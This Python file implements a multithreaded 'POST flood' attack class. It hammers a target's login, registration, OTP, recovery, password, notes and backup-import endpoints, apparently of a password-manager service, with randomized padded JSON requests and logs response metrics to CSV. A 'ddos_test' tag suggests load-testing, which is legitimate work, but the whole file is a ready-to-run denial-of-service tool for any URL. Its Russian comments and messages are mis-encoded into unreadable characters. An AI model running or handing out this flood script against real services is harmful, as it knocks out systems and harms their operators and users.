import requests
import threading
import time
import random
import json
import os
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è colorama –¥–ª—è —Ü–≤–µ—Ç–Ω–æ–≥–æ –≤—ã–≤–æ–¥–∞
init(autoreset=True)

class PostFloodAttack:
    """–ö–ª–∞—Å—Å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è POST Flood –∞—Ç–∞–∫–∏"""
    
    def __init__(self, target_url: str, threads: int = 10, requests_per_thread: int = 100):
        self.target_url = target_url
        self.threads = threads
        self.requests_per_thread = requests_per_thread
        self.running = False
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # POST —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã –¥–ª—è –∞—Ç–∞–∫–∏
        self.post_endpoints = [
            "/auth/register",
            "/auth/login", 
            "/auth/sync-setup",
            "/auth/verify-otp",
            "/auth/initiate-recovery",
            "/auth/cloud-login",
            "/auth/create-transfer-token",
            "/auth/use-transfer-token",
            "/auth/test-email",
            "/auth/verify-cloud-otp",
            "/api/passwords",
            "/api/notes",
            "/api/backup/import"
        ]
    
    def get_request_data(self, endpoint: str):
        """–ü–æ–ª—É—á–∞–µ—Ç –ø–æ–¥—Ö–æ–¥—è—â–∏–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è POST –∑–∞–ø—Ä–æ—Å–∞ –∫ —ç–Ω–¥–ø–æ–∏–Ω—Ç—É"""
        return test_data_generator.get_random_endpoint_data(endpoint)
    
    def attack_thread(self, thread_id: int):
        """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∞—Ç–∞–∫–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ"""
        print(f"{Fore.YELLOW}üöÄ –ü–æ—Ç–æ–∫ {thread_id} –∑–∞–ø—É—â–µ–Ω")
        
        for i in range(self.requests_per_thread):
            if not self.running:
                break
                
            try:
                # –í—ã–±–∏—Ä–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–π POST —ç–Ω–¥–ø–æ–∏–Ω—Ç
                endpoint = random.choice(self.post_endpoints)
                url = self.target_url + endpoint
                
                # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏
                headers = test_data_generator.get_random_headers()
                headers["Content-Type"] = "application/json"
                
                # –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥—Ö–æ–¥—è—â–∏–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è —ç–Ω–¥–ø–æ–∏–Ω—Ç–∞
                post_data = self.get_request_data(endpoint)
                
                # –î–æ–±–∞–≤–ª—è–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è –¥–ª—è —É—Å–ª–æ–∂–Ω–µ–Ω–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏
                if random.choice([True, False]):
                    post_data.update({
                        "timestamp": str(int(time.time())),
                        "clientId": f"client_{random.randint(1000, 9999)}",
                        "requestId": f"req_{random.randint(10000, 99999)}",
                        "metadata": {
                            "version": "1.0",
                            "source": "ddos_test",
                            "extra_field": "x" * random.randint(100, 1000)  # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—ä–µ–º –¥–∞–Ω–Ω—ã—Ö
                        }
                    })
                
                start_time = time.time()
                
                # –í—ã–ø–æ–ª–Ω—è–µ–º POST –∑–∞–ø—Ä–æ—Å
                response = requests.post(
                    url,
                    headers=headers,
                    json=post_data,
                    timeout=10  # –ë–æ–ª—å—à–∏–π timeout –¥–ª—è POST –∑–∞–ø—Ä–æ—Å–æ–≤
                )
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # –°–æ–±–∏—Ä–∞–µ–º –º–µ—Ç—Ä–∏–∫–∏
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="POST_FLOOD",
                    endpoint=endpoint
                )
                
                self.total_requests += 1
                if response.status_code < 400:
                    self.successful_requests += 1
                    print(f"{Fore.GREEN}‚úÖ [{thread_id}] {response.status_code} {endpoint} ({response_time:.3f}s) - {len(json.dumps(post_data))} bytes")
                else:
                    self.failed_requests += 1
                    print(f"{Fore.RED}‚ùå [{thread_id}] {response.status_code} {endpoint} ({response_time:.3f}s)")
                
                # –ù–µ–±–æ–ª—å—à–∞—è —Å–ª—É—á–∞–π–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
                time.sleep(random.uniform(0.01, 0.2))
                
            except requests.exceptions.Timeout:
                metrics_collector.add_metric(
                    response_time=10.0,
                    status_code=0,
                    size=0,
                    attack_type="POST_FLOOD",
                    endpoint=endpoint,
                    error="Timeout"
                )
                self.failed_requests += 1
                print(f"{Fore.YELLOW}‚è±Ô∏è  [{thread_id}] Timeout {endpoint}")
                
            except requests.exceptions.ConnectionError:
                metrics_collector.add_metric(
                    response_time=0,
                    status_code=0,
                    size=0,
                    attack_type="POST_FLOOD",
                    endpoint=endpoint,
                    error="Connection Error"
                )
                self.failed_requests += 1
                print(f"{Fore.RED}üîå [{thread_id}] Connection Error {endpoint}")
                
            except Exception as e:
                metrics_collector.add_metric(
                    response_time=0,
                    status_code=0,
                    size=0,
                    attack_type="POST_FLOOD",
                    endpoint=endpoint,
                    error=str(e)
                )
                self.failed_requests += 1
                print(f"{Fore.RED}üí• [{thread_id}] Error: {str(e)}")
        
        print(f"{Fore.BLUE}üèÅ –ü–æ—Ç–æ–∫ {thread_id} –∑–∞–≤–µ—Ä—à–µ–Ω")
    
    def run(self):
        """–ó–∞–ø—É—Å–∫ POST Flood –∞—Ç–∞–∫–∏"""
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.MAGENTA}üìÆ –ó–ê–ü–£–°–ö POST FLOOD –ê–¢–ê–ö–ò")
        print(f"{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.WHITE}–¶–µ–ª—å: {self.target_url}")
        print(f"{Fore.WHITE}–ü–æ—Ç–æ–∫–æ–≤: {self.threads}")
        print(f"{Fore.WHITE}–ó–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –ø–æ—Ç–æ–∫: {self.requests_per_thread}")
        print(f"{Fore.WHITE}–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤: {self.threads * self.requests_per_thread}")
        print(f"{Fore.WHITE}POST —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã: {', '.join(self.post_endpoints[:3])}...")
        print(f"{Fore.MAGENTA}{'='*60}")
        
        # –û—á–∏—â–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –º–µ—Ç—Ä–∏–∫–∏
        metrics_collector.clear()
        
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # –°–æ–∑–¥–∞–µ–º –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫–∏
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ—Ç–æ–∫–æ–≤
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}‚èπÔ∏è  –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
            self.running = False
        
        end_time = time.time()
        duration = end_time - start_time
        
        # –í—ã–≤–æ–¥–∏–º –∏—Ç–æ–≥–æ–≤—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.MAGENTA}üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ POST FLOOD –ê–¢–ê–ö–ò")
        print(f"{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.WHITE}–í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        print(f"{Fore.WHITE}–û–±—â–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤: {self.total_requests}")
        print(f"{Fore.GREEN}–£—Å–ø–µ—à–Ω—ã—Ö: {self.successful_requests}")
        print(f"{Fore.RED}–ù–µ—É–¥–∞—á–Ω—ã—Ö: {self.failed_requests}")
        
        if duration > 0:
            rps = self.total_requests / duration
            print(f"{Fore.YELLOW}–ó–∞–ø—Ä–æ—Å–æ–≤ –≤ —Å–µ–∫—É–Ω–¥—É: {rps:.2f}")
        
        print(f"{Fore.MAGENTA}{'='*60}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –º–µ—Ç—Ä–∏–∫–∏
        timestamp = int(time.time())
        csv_filename = f"metrics/post_flood_{timestamp}.csv"
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, threads: int = 10, requests_per_thread: int = 100):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ POST Flood –∞—Ç–∞–∫–∏ (—Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å —Å –º–µ–Ω—é)"""
    attack = PostFloodAttack(target_url, threads, requests_per_thread)
    return attack.run() 